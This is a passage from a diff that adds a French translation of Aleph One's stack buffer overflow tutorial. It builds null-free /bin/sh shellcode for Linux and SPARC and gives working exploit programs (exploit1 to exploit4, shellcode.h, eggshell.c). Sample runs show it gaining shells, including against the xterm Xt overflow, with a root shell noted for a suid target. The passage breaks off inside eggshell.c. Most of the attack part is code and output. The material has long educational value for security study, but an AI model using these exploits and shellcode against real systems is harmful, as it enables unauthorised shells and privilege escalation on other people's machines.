+	int    $0x80			# 2 octets
+        call   offset-to-popl           # 5 octets
+        La chaine /bin/sh va ici
+------------------------------------------------------------------------------
+
+   En calculant la distance de jmp … call, de call … popl, de l'adresse de la
+chaine au tableau et de l'adresse de la chaine au mot null, nous obtenons …
+pr‚sent :
+
+------------------------------------------------------------------------------
+        jmp    0x26                     # 2 octets
+        popl   %esi                     # 1 octet
+        movl   %esi,0x8(%esi)           # 3 octets
+        movb   $0x0,0x7(%esi)		# 4 octets
+        movl   $0x0,0xc(%esi)           # 7 octets
+        movl   $0xb,%eax                # 5 octets
+        movl   %esi,%ebx                # 2 octets
+        leal   0x8(%esi),%ecx           # 3 octets
+        leal   0xc(%esi),%edx           # 3 octets
+        int    $0x80                    # 2 octets
+        movl   $0x1, %eax		# 5 octets
+        movl   $0x0, %ebx		# 5 octets
+	int    $0x80			# 2 octets
+        call   -0x2b                    # 5 octets
+        .string \"/bin/sh\"		# 8 octets
+------------------------------------------------------------------------------
+
+   Ca … l'air bon. Pour etre sur que cela fonctionne correctement nous devons
+le compiler et le lancer. Mais il y a un problŠme : notre code s'automodifie
+et la plupart des OS mettent les zones de codes en lecture seule. Pour passer
+outre cette restriction, nous devons placer le code que nous voulons ‚x‚cuter
+dans la pile ou dans le segment de donn‚es et lui passer le controle. Pour
+cela, nous placerons notre code dans un tableau global dans le segment de
+donn‚es. Nous avons d'abord besoin d'une repr‚sentation hexad‚cimale du code
+binaire. Compilons-le d'abord puis utilisons gdb.
+
+shellcodeasm.c
+------------------------------------------------------------------------------
+void main() {
+__asm__("
+        jmp    0x2a                     # 3 octets
+        popl   %esi                     # 1 octet
+        movl   %esi,0x8(%esi)           # 3 octets
+        movb   $0x0,0x7(%esi)           # 4 octets
+        movl   $0x0,0xc(%esi)           # 7 octets
+        movl   $0xb,%eax                # 5 octets
+        movl   %esi,%ebx                # 2 octets
+        leal   0x8(%esi),%ecx           # 3 octets
+        leal   0xc(%esi),%edx           # 3 octets
+        int    $0x80                    # 2 octets
+        movl   $0x1, %eax               # 5 octets
+        movl   $0x0, %ebx               # 5 octets
+        int    $0x80                    # 2 octets
+        call   -0x2f                    # 5 octets
+        .string \"/bin/sh\"             # 8 octets
+");
+}
+------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
+[aleph1]$ gdb shellcodeasm
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000130 <main>:       pushl  %ebp
+0x8000131 <main+1>:     movl   %esp,%ebp
+0x8000133 <main+3>:     jmp    0x800015f <main+47>
+0x8000135 <main+5>:     popl   %esi
+0x8000136 <main+6>:     movl   %esi,0x8(%esi)
+0x8000139 <main+9>:     movb   $0x0,0x7(%esi)
+0x800013d <main+13>:    movl   $0x0,0xc(%esi)
+0x8000144 <main+20>:    movl   $0xb,%eax
+0x8000149 <main+25>:    movl   %esi,%ebx
+0x800014b <main+27>:    leal   0x8(%esi),%ecx
+0x800014e <main+30>:    leal   0xc(%esi),%edx
+0x8000151 <main+33>:    int    $0x80
+0x8000153 <main+35>:    movl   $0x1,%eax
+0x8000158 <main+40>:    movl   $0x0,%ebx
+0x800015d <main+45>:    int    $0x80
+0x800015f <main+47>:    call   0x8000135 <main+5>
+0x8000164 <main+52>:    das
+0x8000165 <main+53>:    boundl 0x6e(%ecx),%ebp
+0x8000168 <main+56>:    das
+0x8000169 <main+57>:    jae    0x80001d3 <__new_exitfn+55>
+0x800016b <main+59>:    addb   %cl,0x55c35dec(%ecx)
+End of assembler dump.
+(gdb) x/bx main+3
+0x8000133 <main+3>:     0xeb
+(gdb)
+0x8000134 <main+4>:     0x2a
+(gdb)
+.
+.
+.
+------------------------------------------------------------------------------
+
+testsc.c
+------------------------------------------------------------------------------
+char shellcode[] =
+	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+	"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+	"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+	"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
+
+void main() {
+   int *ret;
+
+   ret = (int *)&ret + 2;
+   (*ret) = (int)shellcode;
+
+}
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o testsc testsc.c
+[aleph1]$ ./testsc
+$ exit
+[aleph1]$
+------------------------------------------------------------------------------
+
+   Ca marche ! Mais il y a un obstacle. Dans la plupart des cas, nous
+essaierons de faire d‚border un tableau de caractŠre. Ainsi n'importe quel
+octet null de notre shellcode sera interpr‚t‚ comme la fin de la chaine, et
+la copie s'y terminera. Pour que notre exploit fonctionne, il ne faut aucun
+octet null dans notre shellcode. Essayons de les ‚liminer (et en meme temps
+de rendre le code plus petit).
+
+           Instruction probl‚matique :            Remplac‚e par : 
+           --------------------------------------------------------
+           movb   $0x0,0x7(%esi)                xorl   %eax,%eax
+	   molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
+                                                movl   %eax,0xc(%esi)
+           --------------------------------------------------------
+           movl   $0xb,%eax                     movb   $0xb,%al
+           --------------------------------------------------------
+           movl   $0x1, %eax                    xorl   %ebx,%ebx
+           movl   $0x0, %ebx                    movl   %ebx,%eax
+                                                inc    %eax
+           --------------------------------------------------------
+
+   Notre code am‚lior‚ :
+
+shellcodeasm2.c
+------------------------------------------------------------------------------
+void main() {
+__asm__("
+        jmp    0x1f                     # 2 octets
+        popl   %esi                     # 1 octet
+        movl   %esi,0x8(%esi)           # 3 octets
+        xorl   %eax,%eax                # 2 octets
+	movb   %eax,0x7(%esi)		# 3 octets
+        movl   %eax,0xc(%esi)           # 3 octets
+        movb   $0xb,%al                 # 2 octets
+        movl   %esi,%ebx                # 2 octets
+        leal   0x8(%esi),%ecx           # 3 octets
+        leal   0xc(%esi),%edx           # 3 octets
+        int    $0x80                    # 2 octets
+        xorl   %ebx,%ebx                # 2 octets
+        movl   %ebx,%eax                # 2 octets
+        inc    %eax                     # 1 octets
+        int    $0x80                    # 2 octets
+        call   -0x24                    # 5 octets
+        .string \"/bin/sh\"             # 8 octets
+					# total : 46 octets
+");
+}
+------------------------------------------------------------------------------
+
+   Et notre nouveau programme de test :
+
+testsc2.c
+------------------------------------------------------------------------------
+char shellcode[] =
+	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+	"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+void main() {
+   int *ret;
+
+   ret = (int *)&ret + 2;
+   (*ret) = (int)shellcode;
+
+}
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o testsc2 testsc2.c
+[aleph1]$ ./testsc2
+$ exit
+[aleph1]$
+------------------------------------------------------------------------------
+
+
+                              Ecrire un Exploit
+                              ~~~~~~~~~~~~~~~~~
+                        (ou comment exploiter la pile)
+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+   Essayons de rassembler les diverses piŠces. Nous avons le shellcode. Nous
+savons qu'il peut etre mis dans la chaine que nous utiliserons pour
+overflooder le buffer. Nous savons que nous devons faire pointer l'adresse de
+retour vers le buffer. Cet exemple montre ces points :
+
+overflow1.c
+------------------------------------------------------------------------------
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+char large_string[128];
+
+void main() {
+  char buffer[96];
+  int i;
+  long *long_ptr = (long *) large_string;
+
+  for (i = 0; i < 32; i++)
+    *(long_ptr + i) = (int) buffer;
+
+  for (i = 0; i < strlen(shellcode); i++)
+    large_string[i] = shellcode[i];
+
+  strcpy(buffer,large_string);
+}
+------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o exploit1 exploit1.c
+[aleph1]$ ./exploit1
+$ exit
+exit
+[aleph1]$
+------------------------------------------------------------------------------
+
+   Nous avons remplit le tableau large_string[] avec l'adresse de buffer[],
+ce qui est l'emplacement de notre code. Puis nous copions notre shellcode
+dans le d‚but de la chaine large_string. strcpy() va ensuite copier
+large_string dans le buffer sans faire aucun test de taille, et va d‚passer
+sur l'adresse de retour, y r‚‚crivant l'adresse de notre code. Une fois que
+nous avons atteint la fin de main et que le programme essaie de retourner de
+la fonction main, ca saute … notre code et ex‚cute un shell.
+
+   Un problŠme qui apparait quand nous essayons d'overflooder le buffer d'un
+autre programme est d'essayer de trouver quel sera l'adresse du buffer (et
+donc de notre code). La r‚ponse est que pour tout les programmes la pile
+commence … la meme adresse. La plupart des programme ne mettent pas plus de
+quelques centaines ou milliers d'octets dans la pile … la fois. Donc en
+sachant o— la pile commence nous pouvons essayer de deviner o— se situe le
+buffer que nous essayons d'overlooder. Viol… un petit programme qui affiche
+son pointeur de pile :
+
+sp.c
+------------------------------------------------------------------------------
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+void main() {
+  printf("0x%x\n", get_sp());
+}
+------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------
+[aleph1]$ ./sp
+0x8000470
+[aleph1]$
+------------------------------------------------------------------------------
+
+   Consid‚rons que le programme que nous essayons d'exploiter est :
+
+vulnerable.c
+------------------------------------------------------------------------------
+void main(int argc, char *argv[]) {
+  char buffer[512];
+
+  if (argc > 1)
+    strcpy(buffer,argv[1]);
+}
+------------------------------------------------------------------------------
+
+   Nous pouvons cr‚er un programme qui prendra en paramŠtre une taille de
+buffer et un offset … partir de SP (o— nous croyons que le buffer que nous
+voulons exploiter est situ‚). Nous metterons la chaine d'overflow dans une
+variable d'environnement donc facile … manipuler :
+
+exploit2.c
+------------------------------------------------------------------------------
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr += 4;
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+   buff[bsize - 1] = '\0';
+
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+------------------------------------------------------------------------------
+
+   Maintenant, nous pouvons essayer de deviner ce que la taille du buffer et
+l'offset pourraient etre :
+
+------------------------------------------------------------------------------
+[aleph1]$ ./exploit2 500
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable $EGG
+[aleph1]$ exit
+[aleph1]$ ./exploit2 600
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable $EGG
+Illegal instruction
+[aleph1]$ exit
+[aleph1]$ ./exploit2 600 100
+Using address: 0xbffffd4c
+[aleph1]$ ./vulnerable $EGG
+Segmentation fault
+[aleph1]$ exit
+[aleph1]$ ./exploit2 600 200
+Using address: 0xbffffce8
+[aleph1]$ ./vulnerable $EGG
+Segmentation fault
+[aleph1]$ exit
+.
+.
+.
+[aleph1]$ ./exploit2 600 1564
+Using address: 0xbffff794
+[aleph1]$ ./vulnerable $EGG
+$
+------------------------------------------------------------------------------
+
+   Comme nous pouvons le constater, ce n'est pas trŠs efficace. Essayer de
+deviner l'offset meme en sachant o— est le d‚but de la pile est quasiment
+impossible. Nous auront besoin au mieux d'une centaine d'essaies et au pire
+de deux milliers. Le problŠme est que nous devons deviner *exactement* o—
+notre code commencera. Si nous sommes dans l'erreur seulement d'un octets
+on va malgr‚ tout obtenir un segfault ou un illegal instruction. Un moyens
+d'augmenter nos chances et de remplir le d‚but du buffer avec des instructions
+NOP. Pratiquement tout les processeurs possŠdent une instruction NOP qui ne
+fait rien. C'est utilis‚ d'habitude pour retarder l'ex‚cution pour des
+questions de timing. Nous en tirerons avantage et remplirons la moiti‚ de
+notre buffer avec. Nous placerons le shellcode au centre et le ferons suivre
+avec l'adresse de retour. Si nous sommes chanceux et que l'adresse de retour
+pointe n'importe o— dans la s‚rie de NOPs, ils vont etre ex‚cuter jusqu'…
+atteindre notre code. Sur les architecture Intel l'instruction NOP fait un
+octet et son code machine est 0x90. Consid‚rons que la pile commence …
+l'adresse 0xFF, que S repr‚sente le shell code, et que N repr‚sente une
+instruction NOP, alors la nouvelle pile ressemblera … :
+
+bas de la  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     haut de la
+m‚moire    89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF        m‚moire
+           buffer                sfp   ret   a     b     c
+
+<------   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
+                 ^                     |
+                 |_____________________|
+bas de la                                                          haut de la
+pile                                                                     pile 
+
+   Le nouvel exploit est alors :
+
+exploit3.c
+------------------------------------------------------------------------------
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = NOP;
+
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+------------------------------------------------------------------------------
+
+   Une bonne valeur pour la taille de notre buffer est d'environs 100 octets
+de plus que la taille du buffer que nous essayons d'overflooder. Cela placera
+notre code … la fin de ce dernier, donnant beaucoup de place pour les nops,
+mais modifiant encore l'adresse de retour par l'adresse que nous voulons. Le
+buffer que nous essayons d'exploiter fait 512 octets, donc nous utiliserons
+612. Essayons de faire le buffer overflow sur notre programme de teste avec
+notre nouvel exploit :
+
+------------------------------------------------------------------------------
+[aleph1]$ ./exploit3 612
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable $EGG
+$
+------------------------------------------------------------------------------
+
+   Cool ! Du premier coup ! Cela a multipli‚ par une centaine nos chances.
+Essayons maintenant sur un cas r‚el de buffer overflow. Nous utiliserons
+pour notre d‚monstration le buffer overflow sur la librairie Xt. Pour notre
+exemple, nous utiliserons xterm (tous les programmes li‚ … la lib Xt sont
+vuln‚rable). Vous devez faire tourner un serveur X et autoriser les connexions
+… partir de localhost. R‚glez la variables DISPLAY correctement.
+
+------------------------------------------------------------------------------
+[aleph1]$ export DISPLAY=:0.0
+[aleph1]$ ./exploit3 1124
+Using address: 0xbffffdb4
+[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
+Warning: Color name "‰^1ÏFF
+[aleph1]$ exit
+[aleph1]$ ./exploit3 2148 100
+Using address: 0xbffffd48
+[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
+Warning: Color name "‰^1ÏFF
+Warning: some arguments in previous message were lost
+Illegal instruction
+[aleph1]$ exit
+[aleph1]$ ./exploit3 2148 600
+Using address: 0xbffffb54
+[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
+Warning: Color name "‰^1ÏFF
+Warning: some arguments in previous message were lost
+bash$
+------------------------------------------------------------------------------
+
+   Eureka ! Moins d'une dizaine d'essaie et nous avons trouv‚ les nombres
+magiques. Si xterm avait le bit suid root on a maintenant un shell root.
+
+
+                            Petits Buffer Overflows
+                            ~~~~~~~~~~~~~~~~~~~~~~~
+
+   Il y aura des moments o— le buffer que vous voulez exploiter est tellement
+petit que meme le shellcode ne tiendra pas dedans et l'adresse de retour sera
+r‚‚crite par des instructions au lieu de l'adresse de notre code, ou le
+nombre de NOPs que vous pouvez y faire tenir est tellement petit que les
+chances de deviner une adresse correcte est miniscule. Pour obtenir un shell
+de ces programmes nous allons voir un autre moyen de faire. Cette approche
+particuliŠre ne marche que si vous avez accŠs au variables d'environnement
+du programme.
+
+   Nous allons placer notre shellcode dans une variable d'environnement, puis
+faire d‚border le buffer avec l'adresse de cette variable en m‚moire. Cette
+m‚thode augmente ‚galement vos chances de voir l'exploit fonctionner car
+vous pouvez stocker un code aussi gros que vous le souhaitez dans la variable
+d'environnement.
+
+   Les variables d'environnement sont stock‚ au haut de la pile quand le
+programme est lanc‚, toute modification ult‚rieure par setenv() sont allou‚e
+ailleur. La pile au d‚but ressemble donc … :
+
+
+      <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp>
+
+   Notre nouveau programme prendra un arguments en plus, la taille de
+la variable contenant le shellcode et les NOPs. Notre nouvel exploit
+ressemble d‚sormais … :
+
+exploit4.c
+------------------------------------------------------------------------------
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define DEFAULT_EGG_SIZE               2048
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_esp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr, *egg;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, eggsize=DEFAULT_EGG_SIZE;
+
+  if (argc > 1) bsize   = atoi(argv[1]);
+  if (argc > 2) offset  = atoi(argv[2]);
+  if (argc > 3) eggsize = atoi(argv[3]);
+
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_esp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+    *(ptr++) = NOP;
+
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+  egg[eggsize - 1] = '\0';
+
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+  memcpy(buff,"RET=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+------------------------------------------------------------------------------
+
+   Essayons notre nouvel exploit avec notre programme de test vulnerable :
+
+------------------------------------------------------------------------------
+[aleph1]$ ./exploit4 768
+Using address: 0xbffffdb0
+[aleph1]$ ./vulnerable $RET
+$
+------------------------------------------------------------------------------
+
+   Ca fonctionne … la perfection. Maintenant essayons sur xterm :
+
+------------------------------------------------------------------------------
+[aleph1]$ export DISPLAY=:0.0
+[aleph1]$ ./exploit4 2148
+Using address: 0xbffffdb0
+[aleph1]$ /usr/X11R6/bin/xterm -fg $RET
+Warning: Color name
+Warning: some arguments in previous message were lost
+$
+------------------------------------------------------------------------------
+
+   Du premier coup ! Selon le nombre de variables d'environnement que le
+programme d'exploit possŠde en comparaison de celles du programme que l'on
+essaie d'exploiter, l'adresse … deviner peut etre plus faible ou plus grande.
+Essayez aussi bien les offsets positifs et n‚gatifs.
+
+
+
+                            Trouver les Buffer Overflows
+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+   Cpmme signal‚ plus haut, les buffer overflows sont le r‚sultat d'une
+tentative de mettre plus de donn‚e dans un buffer qu'il n'est pr‚vu. Comme C
+ne possŠde aucunne v‚rification de taille en interne, les buffer overflows se
+manifestent souvent par l'‚criture au-del… de la fin d'un tableau de 
+caractŠres. La librairie standard C fournit un certain nombre de fonctions
+pour copier ou concat‚ner des chaine qui ne r‚alisent pas de v‚rification de
+taille. Elles incluent : strcat(), strcpy(), sprintf(), et vsprintf(). Ces
+fonctions travaillent sur des chaines termin‚ par le caractŠre nul et ne font
+pas de v‚rification pour ‚viter le buffer overflows. gets() est une fonction
+qui lit une ligne de stdin et la stocke dans un buffer jusqu'… une nouvelle
+ligne ou un EOF. Aucune v‚rification n'est faite pour pr‚venir du buffer
+overflow. La famille de fonctions scanf() peuvent ‚galement etre utilis‚ si
+vous demandez une s‚quence de caractŠres non blanc (%s), ou une s‚quence non
+vide de caractŠres d'une s‚lection pr‚d‚finie (%[]), que le tableau point‚
+par le pointeur sur char n'est pas assez large pour accepter la s‚quence
+entiŠre de caractŠre et que le champs optionnel maximum width n'a pas ‚t‚ 
+d‚fini (NDT : il s'agit en fait des formats bugs). Si la cible de toute ces
+fonctions est un buffer de taille statique et que ces autres arguments
+d‚rivent d'une maniŠre quelconque d'une entr‚e utilisateur, il y a de bonnes
+chances que vous soyez en mesure d'exploiter un buffer overflow.
+
+   Une autre structure de programme que l'on trouve couramment est l'usage
+d'une boucle while pour lire un caractŠre … la fois … partir de stdin ou d'un
+fichier vers un buffer jusqu'… ce que EOL (fin de ligne), EOF ou un delimiteur
+quelconque soit rencontr‚. Ce type de construction utilise habituellement une
+de ces fonctions : getc(), fgetc() ou getchar(). S'il n'y a pas de test
+explicite pour ‚viter le buffer overflow dans la boucle while alors le
+programme est facilement exploitable.
+
+   Pour conclure, grep(1) est votre ami. Les sources pour les OS libres et
+leurs outils peuvent etre lues. Le fait devient assez vite interessant une
+fois qu'on a r‚alis‚ que plusieurs OS commerciaux sont d‚riv‚s des meme
+sources que les OS libres.
+
+
+     Appendice A - Code de Shell pour diff‚rents SystŠmes et Architectures
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+i386/Linux
+------------------------------------------------------------------------------
+        jmp    0x1f
+        popl   %esi
+        movl   %esi,0x8(%esi)
+        xorl   %eax,%eax
+	movb   %eax,0x7(%esi)
+        movl   %eax,0xc(%esi)
+        movb   $0xb,%al
+        movl   %esi,%ebx
+        leal   0x8(%esi),%ecx
+        leal   0xc(%esi),%edx
+        int    $0x80
+        xorl   %ebx,%ebx
+        movl   %ebx,%eax
+        inc    %eax
+        int    $0x80
+        call   -0x24
+        .string \"/bin/sh\"
+------------------------------------------------------------------------------
+
+SPARC/Solaris
+------------------------------------------------------------------------------
+        sethi   0xbd89a, %l6
+        or      %l6, 0x16e, %l6
+        sethi   0xbdcda, %l7
+        and     %sp, %sp, %o0
+        add     %sp, 8, %o1
+        xor     %o2, %o2, %o2
+        add     %sp, 16, %sp
+        std     %l6, [%sp - 16]
+        st      %sp, [%sp - 8]
+        st      %g0, [%sp - 4]
+        mov     0x3b, %g1
+        ta      8
+        xor     %o7, %o7, %o0
+        mov     1, %g1
+        ta      8
+------------------------------------------------------------------------------
+
+SPARC/SunOS
+------------------------------------------------------------------------------
+        sethi   0xbd89a, %l6
+        or      %l6, 0x16e, %l6
+        sethi   0xbdcda, %l7
+        and     %sp, %sp, %o0
+        add     %sp, 8, %o1
+        xor     %o2, %o2, %o2
+        add     %sp, 16, %sp
+        std     %l6, [%sp - 16]
+        st      %sp, [%sp - 8]
+        st      %g0, [%sp - 4]
+        mov     0x3b, %g1
+	mov	-0x1, %l5
+        ta      %l5 + 1
+        xor     %o7, %o7, %o0
+        mov     1, %g1
+        ta      %l5 + 1
+------------------------------------------------------------------------------
+
+
+               Appendice B - Prog de buffer overflow g‚n‚riques
+               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+shellcode.h
+------------------------------------------------------------------------------
+#if defined(__i386__) && defined(__linux__)
+
+#define NOP_SIZE	1
+char nop[] = "\x90";
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)
+
+#define NOP_SIZE	4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
+  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
+
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+
+#elif defined(__sparc__) && defined(__sun__)
+
+#define NOP_SIZE        4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
+  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
+
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+
+#endif
+------------------------------------------------------------------------------
+
+eggshell.c
+------------------------------------------------------------------------------
+/*
+ * eggshell v1.0
+ *
+ * Aleph One / aleph1@underground.org
+ */
+#include <stdlib.h>
+#include <stdio.h>
+#include "shellcode.h"
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define DEFAULT_EGG_SIZE               2048
+
+void usage(void);
+
+void main(int argc, char *argv[]) {
+  char *ptr, *bof, *egg;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;
+
+  while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
+    switch (c) {
+      case 'a':
+        align = atoi(optarg);
+        break;
+      case 'b':
+        bsize = atoi(optarg);
+        break;
+      case 'e':
+        eggsize = atoi(optarg);
+        break;
+      case 'o':
+        offset = atoi(optarg);
+        break;
+      case '?':
+        usage();
+        exit(0);
+    }
+
+  if (strlen(shellcode) > eggsize) {
+    printf("Shellcode is larger the the egg.\n");
+    exit(0);
+  }
+
+  if (!(bof = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
+    bsize, eggsize, align);
+  printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);
+
+  addr_ptr = (long *) bof;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
+    for (n = 0; n < NOP_SIZE; n++) {
+      m = (n + align) % NOP_SIZE;
